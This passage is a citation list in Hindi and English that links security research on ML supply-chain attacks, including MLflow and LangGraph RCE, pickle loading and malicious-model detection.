- [14] [Hydra block-list commit (RCE के बारे में चेतावनी)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi से RCE तक: LangGraph के Checkpointer का फायदा उठाना](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip bugs को pivot करके उच्च-मूल्य वाले AI/ML bounties तक पहुँचना](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk advisory और PyFunc proof of concept – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow source – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – artifact download और upload endpoints](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Binarly MLTracer static-scanner evasion की taxonomy](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – MLTracer के साथ malicious model का पता लगाना](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [PyTorch storage `_load_from_bytes` implementation](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [CPython pickle `find_class` compatibility mapping](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [CPython `_compat_pickle` import mapping](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
